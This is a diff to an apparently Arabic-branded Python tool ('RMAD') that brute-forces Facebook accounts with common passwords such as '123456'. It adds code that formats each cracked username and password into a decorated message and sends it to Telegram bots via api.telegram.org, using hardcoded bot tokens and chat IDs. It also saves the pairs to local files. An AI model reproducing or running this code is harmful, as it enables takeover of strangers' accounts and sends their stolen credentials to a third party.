@@ -99,8 +99,8 @@ from urllib.parse import quote
 # UA LIST
 
 #ugen2=open('frec.txt','r').read().splitlines()
-token=('6103725322:AAFIuEyk3i5oVACN946LfaATVzF_wdKkfds') 
-ID=('647776789') 
+token9=('6465884825:AAGoNjBz1IfqMRffKtRPXOdvziwxCAhPRGM') 
+ID7=('1783995795') 
 #ugen=open('m.txt','r').read().splitlines()
 ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
 
@@ -1846,7 +1846,7 @@ class Main:
 
 				#print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
 
-				listpass = ('123456')
+				listpass = ("%s123456%s "%(G,Y))
 
 				if len(listpass)<=5:
 
@@ -2651,14 +2651,44 @@ class Main:
 			if "session_key" in response.text and "EAAA" in response.text:
 				if 'ya' in oprek:
 					akun.append(uid+'|'+pw)
-					ceker(uid,pw)
+					ceker(idf,pw)
 				else:
 					print('\n')
-
-					uid,pw = f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
+					statuscp = f'''
+				
+𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
 
 |￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
-                                        حساب شغال ⚡
+                                        حساب سكيور 🧸
+|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
+                     \ (•◡•) /
+                       \       /
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍                     ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                 ❍   
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+
+🛸 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
+
+🛸 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
+
+▄︻デ══━一💨  ⛧°｡⋆CP⋆｡°⛧
+
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍ @R_M_D ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @N_9_N_6 ❍  
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+'''
+					statuscp1 = nel(statuscp, style='red')
+					cetak(nel(statuscp1, title='SESI'))
+					open('CP/'+cpc,'a').write(uid+'|'+pw+'\n')
+					
+					akun.append(uid+'|'+pw)
+					cp+=1
+					requests.get(f"https://api.telegram.org/bot"+str(uiidkdoj)+"/sendMessage?chat_id="+str(izonsl)+"&text="+str(statuscp))
+					
+					statusok = f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
+
+|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
+                                        حساب سكيور 🐧
 |＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
                      \ (•◡•) /
                        \       /
@@ -2679,16 +2709,16 @@ class Main:
 '''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-					requests.get(f"https://api.telegram.org/bot"+str(uiidkdoj)+"/sendMessage?chat_id="+str(izonsl)+"&text="+str(uid,pw))
+					requests.get(f"https://api.telegram.org/bot"+str(uiidkdoj)+"/sendMessage?chat_id="+str(izonsl)+"&text="+str(statusok))
 			
 
-				
+				print("\r \033[0;92m[RMAD-Ok ] %s | %s\033[0;97m         "%(uid, pw))
+
 				print ("\r \033[0;92m Congrats ")
 
 				self.ok.append("%s|%s"%(uid, pw))
 
 				open("2009RMAD-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
-
 				break
 
 			elif "www.facebook.com" in response.json()["error_msg"]:
@@ -2698,6 +2728,27 @@ class Main:
 				self.cp.append("%s|%s"%(uid, pw))
 
 				open("2009RMAD-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				message_text = f"""𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
+
+|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
+                                        حساب قديم 🧸
+|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
+                     \ (•◡•) /
+                       \       /
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍                     ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                 ❍   
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+
+🛸 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
+
+🛸 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
+
+▄︻デ══━一💨  ⛧°｡⋆OK⋆｡°⛧
+
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍ @R_M_D ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @N_9_N_6 ❍  
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛ """
+				requests.post(f"https://api.telegram.org/bot{token9}/sendMessage", data={"chat_id": ID7, "text": message_text})
 
 				break
 
@@ -2732,4 +2783,3 @@ except Exception as e:exit(str(e))
 	
 
 	
-
